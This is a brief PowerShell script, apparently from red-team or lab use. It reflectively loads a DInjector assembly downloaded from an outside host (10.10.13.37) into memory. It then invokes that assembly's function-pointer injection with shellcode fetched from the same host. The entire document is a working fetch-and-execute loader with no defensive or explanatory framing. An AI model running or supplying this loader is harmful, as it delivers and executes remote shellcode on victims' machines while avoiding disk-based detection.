$data = (New-Object System.Net.WebClient).DownloadData("http://10.10.13.37/DInjector.dll")
[System.Reflection.Assembly]::Load($data) | Out-Null

$cmd = "functionpointer /sc:http://10.10.13.37/shellcode.bin"

[DInjector.Program]::Main($cmd.Split(" "))
